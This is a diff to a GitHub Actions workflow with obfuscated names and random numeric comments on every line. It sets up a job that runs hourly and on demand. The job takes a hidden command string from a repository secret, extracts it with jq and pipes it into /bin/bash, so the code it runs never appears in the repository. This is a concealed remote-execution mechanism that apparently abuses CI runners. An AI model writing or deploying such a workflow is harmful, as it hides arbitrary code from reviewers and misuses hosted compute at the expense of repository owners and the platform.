@@ -1,15 +1,15 @@
-name: yongqueji3194 #10460
-on: #3538
-  workflow_dispatch: #5109
-  schedule: #2241
-    - cron: '16 5/6 * * *' #422
-jobs: #18913
-  build: #19693
-    runs-on: ubuntu-latest #24966
-    steps: #24301
-      - uses: actions/checkout@v4 #21713
-      - name: yongqueji3194 #61
-        env: #16479
-          x21107: ${{ secrets.x21107 }} #20892
+name: yongqueji3194 #30037
+on: #29782
+  workflow_dispatch: #11472
+  schedule: #3238
+    - cron: '56 * * * *' #21006
+jobs: #17075
+  build: #24800
+    runs-on: ubuntu-latest #3488
+    steps: #22724
+      - uses: actions/checkout@v4 #3854
+      - name: yongqueji3194 #8315
+        env: #27226
+          j18656: ${{ secrets.j18656 }} #8808
         run: |
-          echo $x21107 | jq -r .l19064 | /bin/bash #28492
+          echo $j18656 | jq -r .y26887 | /bin/bash #22759
